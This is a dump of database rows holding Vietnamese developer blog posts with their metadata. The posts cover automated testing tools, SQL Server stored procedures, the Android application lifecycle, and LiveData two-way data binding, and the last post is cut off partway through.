browser HTML Unit.\n\nNgôn ngữ kịch bản là Ruby, nhưng có thể tự động hóa các ứng dụng web được phát triển bằng bất kỳ ngôn ngữ nào.\n\nKhi sử dụng Ruby, Watir cung cấp cho bạn các tính năng để kết nối với cơ sở dữ liệu, đọc các tệp phẳng, excel – important đối với kiểm thử dựa trên dữ liệu. Bạn có thể sử dụng lại mã kiểm thử , lặp lại trên các tập lệnh kiểm thử.\n\nTích hợp với các công cụ BDD như RSpec, Cucumber, v.v.\n\n[Tải về Watir.](http://watir.com/)\n\n# [16) IBM Rational Functional Tester](https://www.ibm.com/products/software)\n![](https://images.viblo.asia/f40a28ed-2295-4557-8545-5558b1dde139.png)\n\nRational Functional Tester là công cụ kiểm thử tự động  mang tính thương mại của IBM. Nó hỗ trợ một loạt các môi trường phát triển như Siebel, Net, SAP, Java, PowerBuilder, Flex, Dojo cùng với các môi trường khác.\n\nNó hỗ trợ 2 ngôn ngữ kịch bản Java và VB.Net\n\nRational Functional Tester (RFT) tích hợp chặt chẽ với IBM Rational Quality Manager (công cụ quản lý kiểm tra) của IBM.\n\nCông cụ này hỗ trợ kiểm thử chức năng, kiểm thử hồi quy và kiểm thử dựa trên dữ liệu.\n\nStoryboard Testing là một tính năng độc đáo của RFT nơi tập lệnh kiểm thử được ghi lại dưới dạng một loạt ảnh chụp màn hình các hành động được thực hiện đối với Ứng dụng đang thử nghiệm. Người kiểm thử có thể thay đổi ảnh chụp màn hình để nâng cao tính hiệu quả của kịch bản kiểm thử.\n\n[Tải xuống Trình IBM Rational Functional Tester](https://www.ibm.com/products/software)\n\n# [17) Telerik Test Studio](https://www.telerik.com/download/teststudio)\n![](https://images.viblo.asia/59bd11ee-d6bd-4647-8cda-ad3ca3994c9e.png)\nTest Studio là một công cụ tự động mới nhất của Telerik. Nó hỗ trợ tự động hóa các ứng dụng như HTML5, Angular, AJAX, JavaScript, Silverlight, WPF, MVC, Ruby và PHP, iOS, Android. Telerik cung cấp hỗ trợ nhiều trình duyệt và là một công cụ ghi và mở lại.\n\nNó hỗ trợ 2 ngôn ngữ kịch bản C # và VB.Net\n\nTest Studio có thể kết nối với các hệ thống kiểm soát nguồn như Team Foundation Server và GIT và thực hiện Kiểm thử liên tục.\n\nTelerik cho phép lên lịch trình kiểm thử, thực hiện kiểm thử song song và có các tính năng báo cáo kiểm thử mạnh mẽ.\n\n[Tải xuống Telerik Test Studio](https://www.telerik.com/download/teststudio)\n\n# [18) Silk Test](https://www.microfocus.com/en-us/products/silk-test/overview)\n![](https://images.viblo.asia/e4e58771-8a8b-482f-bc62-14a6a396540a.png)\n\nSilk Test là một công cụ kiểm thử tự động hồi quy chức năng và hồi quy từ MicroF Focus.\n\nSilk Test cung cấp 3 sản phẩm Workbench, Silk4J và Silk4NET. Sử dụng ngôn ngữ kịch bản VB.net, Silk4J & Silk4NET  và có thể sử dụng Java / VB.NET, C #, v.v.\n\nSilkTest hỗ trợ kiểm thử đa trình duyệt, Kiểm thử di động & cung cấp môi trường thiết kế kiểm thử Cộng tác thông qua kiểm thử dựa trên Từ khóa.\n\n[Tải xuống SilkTest](https://www.microfocus.com/en-us/products/silk-test/overview)\n\n# [19) Cucumber](https://www.guru99.com/cucumber-tutorials.html)\n\n![](https://images.viblo.asia/0845be89-922d-4bb4-ab60-f0845e7d7ccd.png)\nCucumber là một công cụ phát triển hướng hành vi (BDD) với mã nguồn mở. Cucumber hỗ trợ các ngôn ngữ như Ruby, Java, Scala, Groovy, v.v.\n\nXây dựng kịch bản kiểm thử là một nỗ lực chung của người kiểm thử, nhà phát triển và khách hàng. Cucumber chỉ hỗ trợ môi trường web. Mã kiểm thử được viết bằng tiếng Anh đơn giản gọi là Gherkin. Mã Cucumber có thể được thực thi trên các frameworks khác nhau như Selenium, Ruby, v.v.\n\nTrọng tâm của frameworks là trải nghiệm người dùng cuối.\n\n[Tìm hiểu thêm về frameworks](https://www.guru99.com/cucumber-tutorials.html)\n\n# [20) WorkSoft Certify](https://www.worksoft.com/sap-test-automation/)\n![](https://images.viblo.asia/76942617-2c43-4508-9969-9b1e1e576319.png)\n\nWorkSoft Certify là một công cụ kiểm thử tự động hóa cho SAP. Nó có thể kiểm tra và tự động hóa các SuccessFactors, Concur, Syclo, Mạng Ariba, Trải nghiệm người dùng SAP Fiori (UX)\n\nWorkSoft Certify có thể chạy kiểm thử không giám sát và tự động đến khi kết thúc luồng hoạt động. Công cụ này có thể được triển khai ngay cả khi dự án SAP đang trong giai đoạn triển khai, nâng cấp hoặc bảo trì.\n\nWorkSoft Certify duy trì một kho lưu trữ đối tượng kiểm thử trung tâm như bảo trì tập lệnh kiểm thử và việc sử dụng lại sẽ trở nên dễ dàng  hơn. Nó cung cấp công cụ quản lý dữ liệu kiểm thử tích hợp.\n\n[Tải xuống WorkSoft Certify](https://www.worksoft.com/sap-test-automation/)\n# [21) Katalon Studio](https://www.katalon.com/)\n![](https://images.viblo.asia/2231a3a1-c983-4891-8c16-8587de7dda30.png)\n\nKatalon Studio là một công cụ tự động với mã nguồn mở và hỗ trợ môi trường web, di động.\n\nNó là công cụ hoạt động hàng đầu trên Selenium và Appium, từ đó nâng cao các frameworks  đó với tính năng như do thám đối tượng, IDE thân thiện với người dùng, cùng kho lưu trữ đối tượng và plugin trình duyệt\n\nCông cụ này sử dụng Groovy làm ngôn ngữ kịch bản & hỗ trợ thư viện Java bên ngoài. Katalon cho phép bạn sử dụng lại các tập lệnh Selenium được viết bằng Java và sử dụng trực tiếp. Nó hoạt động hoàn hảo với các hệ thống Tích hợp liên tục như Jenkins, Bamboo và TeamCity.\n\n[Tải xuống Katalon Studio](https://www.katalon.com/)\n\n# [22) TestComplete](https://smartbear.com/product/testcomplete/features/)\n![](https://images.viblo.asia/12c4ff91-e0a3-40ad-8da3-810424e5642c.png)\nTestcomplete là một công cụ kiểm thử tự động chức năng  một cách mạnh mẽ mà dễ sử dụng đến từ SmartBear. Nó có thể tự động kiểm thử trên các ứng dụng máy tính để bàn, thiết bị di động và web.\n\nTestComplete hỗ trợ nhiều kịch bản ngôn ngữ như VBScript, Python và JavaScript với các kỹ thuật kiểm thử khác nhau như kiểm thử dựa trên từ khóa, kiểm thử dựa trên dữ liệu, kiểm thử hồi quy và kiểm thử phân tán.\n\nVới tính năng ghi lại và phát lại cùng với sự nhận dạng đối tượng mạnh mẽ, bạn cũng có thể tạo các tập lệnh kiểm thử tự động phức tạp mà không cần viết một dòng mã nào.\n\n[Tải xuống TestComplete](https://smartbear.com/product/testcomplete/features/)\n\n# Tài liệu tham khảo \nhttps://www.guru99.com/automated-testing-tools.html	12) Automai AppVerify\n\nAutomai AppVerify cung cấp kiểm thử tự động liên tục với độ chính xác 100% từ bên ngoài. Hỗ trợ kịch bản không mã hóa và trực quan cho phép bạn xây dựng các kịch bản phức tạp mà không cấn kịch bản mẫu trước đó. Hoạt động với tất cả các quy trình hoạt động thông qua Citrix, ứng dụng web hoặc ứng dụng fat client.\n\nCác tính năng chính:\n\n* Kịch bản không cần mã hóa\n* Kiểm tra...	{https://images.viblo.asia/e98aa342-89af-41af-81ff-d13106945779.png,https://images.viblo.asia/815ff80a-15a2-4f04-991d-d843e08edcdf.jpg,https://images.viblo.asia/d4226e69-1cb5-454d-966e-74440311edd5.png,https://images.viblo.asia/d07f93c7-ac57-4e97-897a-80d341fdd7f4.png,https://images.viblo.asia/f40a28ed-2295-4557-8545-5558b1dde139.png,https://images.viblo.asia/59bd11ee-d6bd-4647-8cda-ad3ca3994c9e.png,https://images.viblo.asia/e4e58771-8a8b-482f-bc62-14a6a396540a.png,https://images.viblo.asia/0845be89-922d-4bb4-ab60-f0845e7d7ccd.png,https://images.viblo.asia/76942617-2c43-4508-9969-9b1e1e576319.png,https://images.viblo.asia/2231a3a1-c983-4891-8c16-8587de7dda30.png,https://images.viblo.asia/12c4ff91-e0a3-40ad-8da3-810424e5642c.png}	1	Các công cụ kiểm thử tự động nổi bật trong năm 2019 ( Phần 2)	{qa-tools,auto,qa-specialtool,autotesting,ab-testing}	0	f	2022-12-18 15:33:38.299+00	2022-12-18 15:33:38.299+00
31914	Stored Procedure là 1 phần không thể thiếu của SQL Server. Chúng có thể hỗ trợ rất nhiều cho lập trình và cấu hình cơ sở dữ liệu.\n\nMột Stored Procedure là bao gồm các câu lệnh Transact-SQL và được lưu lại trong cơ sở dữ liệu. Các lập trình viên chỉ cần gọi ra và thực thi thông qua SQL Server Management Studio hoặc ngay trong ứng dụng đang phát triển.\n\nTransact-SQL dựa trên SQL, nó là một ngôn ngữ lập trình được sử dụng làm trung gian giữa cơ sở dữ liệu và các ứng dụng. Nó tương đối dễ học vì thực chất nó được tạo bởi hầu hết là các lệnh SQL.\n\n# Lợi ích của Stored Procedure\n\n| Lợi ích | Giải thích |\n| -------- | -------- | \n| Module hóa | Bạn chỉ cần viết Stored Procedure 1 lần, sau đó có thể gọi nó nhiều lần ở  trong ứng dụng.|\n| Hiệu suất | Stored Procedure thực thi mã nhanh hơn và giảm tải băng thông. <br> - **Thực thi nhanh hơn**: Stored Procedure sẽ được biên dịch và lưu vào bộ nhớ khi được tạo ra. Điều đó có nghĩa rằng nó sẽ thực thi nhanh hơn so với việc gửi từng đoạn lệnh SQL tới SQL Server. Vì nếu bạn gửi từng đoạn lệnh nhiều lần thì SQL Server cũng sẽ phải biên dịch lại nhiều lần, rất mất thời gian so với việc biên dịch sẵn.<br> - **Giảm tải băng thông**: Nếu bạn gửi nhiều câu lệnh SQL thông qua network đến SQL Server sẽ ảnh hưởng tới hiệu suất đường truyền. Thay vì gửi nhiều lần thì bạn có thể gom các câu lệnh SQL vào 1 Stored Procedure và chỉ phải gọi đến 1 lần duy nhất qua network.|\n|Bảo mật|Trong SQL Server có các tác vụ cấp cao mà người dùng bình thường không thể truy cập vào được. Bằng việc cung cấp các Stored Procedure đã truy cập tới các tác vụ này cho người dùng thường thì không sao hết. Vì làm vậy thì người dùng thường sẽ truy cập gián tiếp mà không ảnh hưởng tới vấn đề bảo mật của SQL Server.|\n\n# Tạo Stored Procedure\nBạn tạo Stored Procedure được lưu trữ trong SQL Server Management Studio bằng cách sử dụng câu lệnh *CREATE PROCEDURE*:\n```sql\nCREATE PROCEDURE StoredProcedureName AS\n...\n```\nĐoạn mã sau tạo một Stored Procedure gọi là "MyStoredProcedure":\n```sql\nCREATE PROCEDURE MyStoredProcedure AS\nSET ROWCOUNT 10\nSELECT Products.ProductName AS TenMostExpensiveProducts, Products.UnitPrice\nFROM Products\nORDER BY Products.UnitPrice DESC\n```\n# Chỉnh sửa Stored Procedure\nNếu bạn cần sửa đổi một Stored Procedure, bạn chỉ cần thay CREATE bằng ALTER.\n\n```sql\nALTER PROCEDURE MyStoredProcedure AS\n...\n```\n# Thực thi Stored Procedure\nBạn có thể chạy một Stored Procedure bằng cách sử dụng EXECUTE hoặc EXEC. Ví dụ: để chạy  Stored Procedure  ở trên, hãy nhập như sau:\n```sql\nEXEC MyStoredProcedure\n```\nNếu Stored Procedure có khoảng trắng bên trong tên của nó, hãy đặt nó giữa các dấu ngoặc kép:\n```sql\nEXEC "My Stored Procedure"\n```\nNếu Stored Procedure của bạn cần truyên thêm các param:\n```sql\nEXEC MyStoredProcedure @ParameterName="MyParameter"\n```\n# Sử dụng qua GUI\nBạn có thể thực thi Stored Procedure trên trực tiếp giao diện của SQL Server mà không dùng câu lệnh:\n1. Di chuyển đến "Stored Procedures" của Database mà bạn đang làm việc.\n2. Chọn Stored Procedure của bạn đã tạo và nhấn chuộn phải chọn "Execute Stored Procedure..."\n3. Nếu như Stored Procedure của bạn cần param thì 1 hộp thoại sẽ xuất hiện để bạn nhập.\n4. Nhấp "OK".\n5. Sau đó SQL Server sẽ show kết quả thực thi cho bạn.\n\n# Parameters\nParameters(tham số) là giá trị mà Stored Procedure của bạn sử dụng để thực hiện tác vụ của nó. Khi bạn viết một Stored Procedure, bạn có thể chỉ định các Parameters cần được cung cấp từ người dùng. \n\nVí dụ: Nếu bạn viết một Stored Procedure để show ra chi tiết địa chỉ về một ái đó, thì Stored Procedure của bạn cần biết thông tin nào đó để tìm ra người đó. Trong trường hợp này, người dùng có thể cung cấp UserId để cho Stored Procedure lọc dữ liệu từ Database và trả về cho người dùng.\n# System Stored Procedures\nSQL Server bao gồm một số lượng lớn các System Stored Procedure để hỗ trợ các việc quản trị cơ sở dữ liệu. \n\nMột số điều bạn có thể làm với các System Stored Procedure bao gồm:\n- Cấu hình tài khoản bảo mật.\n- Thiết lập liên kết các máy chủ.\n- Tạo kế hoạch bảo trì cơ sở dữ liệu.\n- ...	Stored Procedure là 1 phần không thể thiếu của SQL Server. Chúng có thể hỗ trợ rất nhiều cho lập trình và cấu hình cơ sở dữ liệu.\n\nMột Stored Procedure là bao gồm các câu lệnh Transact-SQL và được lưu lại trong cơ sở dữ liệu. Các lập trình viên chỉ cần gọi ra và thực thi thông qua SQL Server Management Studio hoặc ngay trong ứng dụng đang phát triển.\n\nTransact-SQL dựa trên SQL, nó là một ngôn n...	{}	1	Giới thiệu Stored Procedure trong SQL Server	{sql,storedprocedure}	0	f	2022-12-18 15:33:38.334+00	2022-12-18 15:33:38.334+00
31895	![](https://images.viblo.asia/73203cd0-e903-42f2-89fb-e3d61454d1f1.png)\n# Giới thiệu\nTrước khi bắt đầu, hãy thử đếm số lượng ứng dụng di động đang có sẵn trong chiếc điện thoại Android của bạn. Mệt mỏi vì đếm số lượng ứng dụng Android trên điện thoại của bạn? Vâng, điều này là phổ biến cho tất cả người dùng Android. Chúng ta có rất nhiều app để phục vụ cho cuộc sống hằng ngày.\n\nNhưng nếu bạn là một Android developer và cách bạn nhìn vào một app Android nên khác với những người sử dụng Android thông thường. Bạn nên biết mọi thứ về vòng đời của một ứng dụng Android một cách cụ thể. Bạn phải biết rõ về vòng đời của ứng dụng mà bạn đang tạo ra cho người dùng. Nếu bạn không hiểu đúng đắn về lifecycle của application thì cũng sẽ không có bất kỳ ảnh hưởng nào đến hoạt động của ứng dụng nhưng điều này sẽ gây ấn tượng xấu về ứng dụng của bạn đối với người dùng. Nếu bạn muốn tìm hiểu hơn về nó, vậy hãy bắt đầu cùng mình nhé :D\n\nTrong bài này, chúng ta sẽ soi vào vòng đời của một ứng dụng Android. Chúng ta sẽ cố gắng xem điều này sẽ ảnh hưởng như thế nào đến trải nghiệm của người dùng. Vậy nên, let’s get started.\n\n# Android Application life cycle\nAndroid là một ví dụ về việc đa tác vụ, nghĩa là bạn có thể chạy nhiều công việc cùng một lúc. Trên thực tế, chúng ta không thực hiện nhiều nhiệm vụ tại một thời điểm cụ thể, thay vào đó, dường như chúng ta đang thực hiện nhiều nhiệm vụ cùng một lúc. Theo một cách rất đơn giản, tại bất kỳ thời điểm cụ thể nào, chỉ một ứng dụng có thể ở trạng thái chạy và các ứng dụng khác sẽ ở trạng thái nền. Tất cả các quy trình này được quản lý và xử lý theo cách mà dường như chúng ta đang thực hiện nhiều hơn một nhiệm vụ tại một thời điểm.\n\nNhưng vấn đề nảy sinh ở đây là, một thiết bị Android cụ thể có một số lượng hạn chế về space và tốc độ xử lý, và để có thể vận hàng một cách trôi chảy hoặc cung cấp việc vận hàng trôi chảy cho tất cả các ứng dụng, và để mang lại trải nghiệm tốt hơn cho người dùng , Android đẩy ứng dụng ít được sử dụng nhất trong một số bộ đệm. Bằng cách làm như vậy, ứng dụng không được sử dụng trong một thời gian dài hơn sẽ bị đẩy xuống nền và có thể phương thức onStop() sẽ được gọi để dừng hoạt động của ứng dụng đó.\n\n# LRU Cache\nLRU hay Least Recently Used Cache là bộ đệm được HĐH Android sử dụng để đẩy các ứng dụng ít được sử dụng nhất trong thời gian gần. Ví dụ: nếu bạn đang chạy ứng dụng âm nhạc cùng với ứng dụng Email, Facebook, Instagram và Whatsapp thì ứng dụng mà bạn không sử dụng trong một thời gian dài sẽ được đặt ở vị trí đầu của bộ đệm và ứng dụng được sử dụng gần đây sẽ được đặt ở phía sau của hàng đợi bộ đệm LRU.\n\nVí dụ: nếu ứng dụng Email ít được sử dụng nhất và ứng dụng Facebook là ứng dụng được sử dụng nhiều nhất trên điện thoại di động tại một thời điểm cụ thể, thì ứng dụng Email sẽ được đặt ở phía trước hàng đợi của bộ đệm LRU và ứng dụng Facebook sẽ được đặt ở mặt sau của hàng đợi bộ đệm LRU.\n\nNgoài ra, nếu ứng dụng được khởi động lại hoặc mở lại, thì nó sẽ được đặt lại ở phía sau trong hàng đợi của bộ đệm.\n\n# Độ ưu tiên của Android Application\nCho đến nay, chúng ta đã thấy rằng, để có một bộ nhớ và quản lý pin phù hợp trong thiết bị Android, Android sẽ đẩy hoặc kill các ứng dụng ít được ưu tiên hơn. Để giải phóng không gian cho thiết bị Android, Android sử dụng một số bộ quy tắc và gán mức độ ưu tiên cho các ứng dụng dựa trên trạng thái chạy hiện tại của ứng dụng. Sau đây là trạng thái quy trình được liên kết với Ứng dụng Android:\n\nLưu ý: Ưu tiên được xếp theo thứ tự cao hơn đến thấp hơn\n\n1. Foreground process: Một quy trình được cho là ở trạng thái Foreground nếu người dùng đang tương tác với quy trình đó.  Ví dụ: nếu bạn đang xem một số video trên ứng dụng YouTube, thì ứng dụng YouTube sẽ được gọi là ở trạng thái Foreground vì ứng dụng đó hiện đang được người dùng sử dụng. Vì vậy, các ứng dụng ở trạng thái Foreground có mức độ ưu tiên cao nhất.\n\n2. Visible process: Một quá trình được cho là ở trạng thái visible khi hoạt động của ứng dụng có thể nhìn thấy nhưng không phải trong Foreground. :) Hơi khó hiểu nhỉ? Hãy lấy một ví dụ thế này, bất cứ khi nào bạn đang sử dụng một số ứng dụng yêu cầu một số loại quyền thì bạn đang sử dụng quy trình hiển thị. Chẳng hạn, hãy để lấy ví dụ về ứng dụng Instagram, khi bạn muốn tải lên một số hình ảnh từ thiết bị của mình thì ứng dụng sẽ yêu cầu bạn cho phép lưu trữ. Tại thời điểm này, hoạt động trên Instagram của bạn có thể nhìn thấy nhưng không ở phía trước vì, ở phía trước, bạn đang có hộp quyền yêu cầu quyền lưu trữ.\n\n3. Service process: Một quy trình được gọi là Service nếu nó hiện đang chạy nhưng nó không thuộc hai loại trên. Điều này hữu ích cho những ứng dụng thực hiện một số tác vụ nền như tải xuống một số dữ liệu hoặc tải lên một số dữ liệu. Một ví dụ về quy trình dịch vụ là tải lên các tệp trong ổ Google, nơi tải lên các tệp được thực hiện ở chế độ nền.\n\n\n4. Background process: Một quy trình được cho là ở trạng thái background nếu onStop() method được gọi bởi Android. Giả sử bạn đang sử dụng một số ứng dụng và bạn đột nhiên nhấn nút home của điện thoại di động thì tại thời điểm đó, ứng dụng của bạn sẽ chuyển sang trạng thái Background từ trạng thái Foreground. Ngoài ra, ứng dụng sẽ được đặt trong bộ đệm LRU để nó được gọi bất cứ khi nào người dùng mở lại ứng dụng. Điều này được thực hiện vì bắt đầu từ đầu khó hơn với tiếp tục từ trạng thái trung gian.\n\n5. Empty process: Một quy trình được cho là ở trạng thái empty nếu nó không thuộc phạm vi của bốn trạng thái quy trình được đề cập ở trên. Trong empty process, không có thành phần hoạt động nào của ứng dụng, tức là mỗi và mọi thành phần của quy trình sẽ ở trạng thái dừng. Ứng dụng có thể được đưa vào LRU cho mục đích lưu trữ tốt hơn nhưng khi bộ nhớ không có hoặc có dung lượng thấp, thì sau đó ứng dụng đó cũng sẽ bị xóa khỏi bộ đệm.\n\n# Tại sao phải để ý đến Application life cycle?\nNgay từ đầu bài viết, tôi đã nói với bạn rằng nếu bạn không có kiến thức về vòng đời của Ứng dụng thì hoạt động của ứng dụng sẽ không bị ảnh hưởng nhưng trải nghiệm của người dùng sẽ rất tệ. Khoan đã :open_mouth: ! Vậy, tại sao chúng ta  học Application life cycle nếu nó không ảnh hưởng đến hoạt động của ứng dụng?\n\nTrước khi trả lời câu hỏi này, mình. Tôi muốn các bạn mở Power Use của điện thoại di động bằng các ứng dụng di động có trong điện thoại của bạn.\n\nĐây là của mình:\n![](https://images.viblo.asia/498b1ddc-ced0-4a71-a279-703d7d012f1a.jpg)\nBạn có thể thấy rằng ngoài hệ thống Android, tại một thời điểm cụ thể, ứng dụng Hotstar là một ứng dụng phát video được sử dụng 12,1% tổng pin. Ngoài ra, ứng dụng YouTube, một lần nữa là ứng dụng phát video được sử dụng 4,7% tổng lượng pin hiện có. Điều này là do cả hai ứng dụng này sử dụng một số loại truyền dữ liệu qua Internet và pin đang được sử dụng để thiết lập, duy trì và ngắt kết nối dịch vụ.\n\nĐiều gì sẽ xảy ra nếu ứng dụng của bạn mất hoặc sử dụng nhiều pin? Ứng dụng của bạn sẽ được người dùng ưa thích sử dụng chứ? Câu trả lời là không. Trong khi tạo một ứng dụng Android, bạn nên xử lý từng trạng thái ứng dụng của ứng dụng Android.\n\nVí dụ: nếu bạn đang sử dụng một số thao tác nhận và gửi dữ liệu trong ứng dụng của mình và bạn muốn quản lý và giữ session bất cứ khi nào ứng dụng chạy thì bạn nên xử lý các thao tác sẽ được thực hiện khi ứng dụng của bạn ở trạng thái background. Nếu ứng dụng của bạn ở trạng thái background thì bạn không nên tổ chức session vì điều này sẽ dẫn đến việc sử dụng tài nguyên nhiều hơn và đến lượt nó, sẽ sử dụng nhiều pin và bộ nhớ hơn. Vì vậy, ở trạng thái onPause (), bạn nên nhả  session và ở trạng thái onResume (), bạn nên xây dựng lại và session và thực hiện các thao tác còn lại.\n\nBằng cách đó, ứng dụng của bạn sẽ có tác động tốt đến người dùng và người dùng của bạn sẽ giới thiệu ứng dụng cho bạn bè của họ. Vì vậy, vòng đời ứng dụng Android là rất quan trọng để tạo ra một ứng dụng Android.\n\n# Kết luận\nTrong bài viết này, chúng ta đã tìm hiểu về vòng đời của Application trong Android. Chúng ta đã thấy các trạng thái khác nhau có thể ảnh hưởng đến hoạt động của các ứng dụng Android trên điện thoại. Chúng ta cũng thấy làm thế nào để có thể  sử dụng vòng đời của Application để tạo một ứng dụng có ấn tượng tốt cho người dùng và sẽ giúp bạn tạo một ứng dụng có thể tiếp cận với hàng tỷ người dùng.\n\nNguồn tham khảo: https://blog.mindorks.com/understanding-the-application-lifecycle-in-android	![](https://images.viblo.asia/73203cd0-e903-42f2-89fb-e3d61454d1f1.png)\n\n\nGiới thiệu\nTrước khi bắt đầu, hãy thử đếm số lượng ứng dụng di động đang có sẵn trong chiếc điện thoại Android của bạn. Mệt mỏi vì đếm số lượng ứng dụng Android trên điện thoại của bạn? Vâng, điều này là phổ biến cho tất cả người dùng Android. Chúng ta có rất nhiều app để phục vụ cho cuộc sống hằng ngày.\n\nNhưng nếu bạn là một Android developer và cách bạn nhìn vào một app Android nên khác với ...	{https://images.viblo.asia/73203cd0-e903-42f2-89fb-e3d61454d1f1.png,https://images.viblo.asia/498b1ddc-ced0-4a71-a279-703d7d012f1a.jpg}	1	Tìm hiểu về Application Lifecycle trong Android	{android}	0	f	2022-12-18 15:33:38.355+00	2022-12-18 15:33:38.355+00
31908	## Introduction\n\nData Binding ngày càng phổ biến hơn trong quá trình phát triển các ứng dụng Android bởi vì nó được gia tăng lợi ích bởi kiến trúc MVVM. Nó cho phép bạn bind các thành phần UI trong layouts của mình với các nguồn dữ liệu trong ứng dụng sử dụng một cấu trúc định nghĩa sẵn hơn là việc lập trình. Tự động thông báo về các thay đổi dữ liệu cho UI và nhận lại những thay đổi thuộc tính của nó có phải tuyệt vời hơn không? Do đó hãy xem xét làm thế nào chúng ta có thể bind vào LiveData với one- và two-way binding.\n\n## Why binding to LiveData?\n\nLợi ích của việc sử dụng các thành phần lifecycle aware như là LiveData bao gồm:\n1. **Không có crashes gây ra bởi các Activities dừng hoạt động**. Nếu vòng đời của các đối tượng observers kết thúc như là khi một activity được đẩy vào trong back stach thì nó sẽ không nhận bất cứ sự kiện nào của LiveData.\n2. **Thích hợp cho các thay đổi cấu hình(Configuration changes)**. Nếu một activity hoặc fragment bị khởi tạo lại vì một thay đổi cấu hình(ví dụ xoay thiết bị), nó ngay lập tức nhận được dữ liệu tồn tại ở trạng thái cuối cùng.\n3. **Không Memory leaks**. Không cần phải sắp xếp các subscriptions bằng tay. Các observers tự thu dọn chính nó khhi mà vòng đời liên quan tới nó bị hủy.\n\n## LiveData VS ObservableFields.\n\nKhông giống như những đối tượng cái mà triển khai Observable - như là observeale fields, Các đối tượng LiveData biết về vòng đời của các observers đã đăng kí các sự kiện thay đổi dữ liệu. Cả LiveData và ObservableFields đều lắng nghe các thay đổi, tuy nhiên lợi ích của việc sử dụng LiveData so với cái còn lại được chỉ ra như sau:\n1. **Không cần quá trình xử lý vòng đời bằng tay**. Các thành phần UI chỉ lắng nghe dữ liệu liên quan và không dừng hoặc làm mới quá trình lắng nghe. LiveData tự động quản lý tất cả điều này bởi vì nó theo dõi các thay đổi trạng thái vòng đời của đối tượng observer liên quan trong suốt quá trình theo dõi đó.\n2. **Có thêm nhiều tính năng với [Transformations](https://developer.android.com/reference/android/arch/lifecycle/Transformations) và [MediatorLiveData](https://developer.android.com/reference/android/arch/lifecycle/MediatorLiveData)**. Quá trình sử dụng LiveData sẽ cho bạn nhiều lợi ích từ sức mạnh của Transformations cũng như thêm nhiều nguồn vào MediatorLiveData. Do đó nếu bạn có 5 EditText views trong layout của mình, bạn không cần lắng nghe cả 5 cái từ Activity hay Fragment của mình. Bạn có thể theo dõi chỉ một MediatorLiveData cái sẽ tiết kiệm cho bạn rất nhiều dòng code và các logic phức tạp.\n3. **Quá trình chia sẻ tài nguyên**. Quá trình tạo các đối tượng kế thừa LiveData sẽ cho phép bạn kết nối với hệ thống dịch vụ chỉ một lần, rồi bất cứ observer nào cần tài nguyên cũng có thể chỉ cần theo dõi đối tượng đó.\n\n## Starting using LiveData with Data Binding.\n\nĐể sử dụng một đối tượng LiveData cho lớp binding của bạn, bạn cần chỉ rõ lifecycle owner nhằm định nghĩa phạm vị cho đối tượng LiveData. Ví dụ bên dưới trình bày cách làm thế nào để thiết lập Activity như là một lifecycle owner sau khi lớp binding được khởi tạo:\n```\n// Inflate view and obtain an instance of the binding class.\nval binding: MainBinding = DataBindingUtil.setContentView(this, R.layout.main)\n// Specify the current activity as the lifecycle owner.\nbinding.setLifecycleOwner(this)\n```\n\nNhư vậy giờ đây bạn có thể sử dụng các đối tượng LiveData trong file layout(main.xml) như bên dưới và gí trị của **commentText** sẽ được thiết lập trong thuộc tính text:\n```\n<android.support.design.widget.TextInputEditText\n    android:text="@{viewModel.commentText}" />\n```\n\nTrong một vài trường hợp một cảnh báo "... is a boxed field but needs to be un-boxed to excute..." có thể xuất khiện khi sử dụng LiveData trong DataBinding. Điều này chỉ ra rằng loại giá trị của LiveData được sử dụng có thể null. Để loại bỏ cảnh báo này nó khuyến nghị chúng ta sử dụng một kiểu nguyên thủy(ObserableIn thay cho MutableLiveData&lt;Integer&gt;) hoặc sử dụng **safeUnbox** như bên dưới:\n```\nandroid:text="@{safeUnbox(viewModel.commentText)}"\n```\n\n## Implementing Two-Way Binding.\n\nTwo-way binding trở nên tiện dụng trong các trường hợp khi giá trị LiveData được kì vọng được cập nhật từ phía UI. Khi nó được truy cập trong code, chúng ta cần nhận được các giá trị đã được cập nhật từ phía view. Để làm được điều đó chúng ta sẽ thêm **"="** vào trước dấu ngoặc nhọn của biểu thức binding:\n```\n<android.support.design.widget.TextInputEditText\n    android:text="@={viewModel.commentText}" />\n```\n\nGiờ đây, mỗi khi user gõ vào một đoạn text mới từ phía view trên màn hình, đối tượng LiveData sẽ được cập nhật và khi truy cập tới giá trị của nó chúng ta sẽ nhận được giá trị được cập nhật cuối cùng.\n\n### Creating a custom Binding Adapter.\n\nXa hơn nữa, hãy nghĩ về trường hợp thông thường nhất, Hình dung chúng ta sẽ thiết lập tab hiện tại cho một ViewPager thông qua data binding bằng cách sử dụng đối tượng LiveData. Để làm điều đó, chúng ta sẽ tạo một thuộc tính tùy biến **currentTab** cho ViewPager với sự trợ giúp của BindingAdapter:\n```\ncompanion object {\n   @BindingAdapter("currentTab")\n   @JvmStatic \n   fun setNewTab(pager: ViewPager, newTab: MutableLiveData<Int>) {\n       newTab.value?.let {\n          //don't forget to break possible infinite loops!\n          if (pager.currentItem != itemLiveData.value) {       \n              pager.setCurrentItem(newTab.value, true)\n          }\n       }\n   }\n}\n```\n\nNhư vậy, giờ đây chúng ta có thể thêm vào thuộc tính mới cho file layout và thiết lập item hiện tại cho ViewPager qua giá trị của đối tượng LiveData:\n```\n<android.support.v4.view.ViewPager\n    app:currentTab="@{viewModel.pagerCurrentTab}"/>\n```\n\nKhi giá trị mới được thiết lập cho đối tượng **pagerCurrentTab**, mã nguồn trong thân của BindingAdapter sẽ được thực thi.\n\n### Using Two-Way Binding With Custom Attribute.\n\nBây giờ, khi quá trình cập nhật giá trị của đối được LiveData được tạo, ViewPager được scroll tới một vị trí mới. Đó là ngoại lệ đúng trong trường hợp thực tế, người dùng cũng tương tác với UI và thay đổi vị trí của ViewPager nhưng đối tượng LiveData vẫn giữ giá trị cũ. Chúng ta muốn thông báo các thay đổi của thuộc tính này để mà thực hiện một vài logic dựa trên nó hoặc chỉ kiểm tra xem giá trị hiện tại. Điều này có thể đạt được bằng cách triển khai **two-way binding**.\n\nChúng ta sẽ phải thay đổi file layout giống như bên dưới:\n```\n<android.support.v4.view.ViewPager\n    app:currentTab="@={viewModel.pagerCurrentTab}"/>\n```\n\nMột sự thay đổi khác sẽ là quá tình tạo thêm một InverseBindingAdapter vào trong BindingAdapter chúng ta đã có. Tại thời điểm này, data binding biết các gì được thực hiện khi dữ liệu thay đổi(nó gọi phương thực được đánh dấu **@BindingAdapter**) và cái gì được gọi khi thuộc tính của view thay đổi(Nó gọi **InverseBindingListener**). Như vậy giờ đây nếu người dùng swipe ViewPager tabs, đối tượng LiveData sẽ được 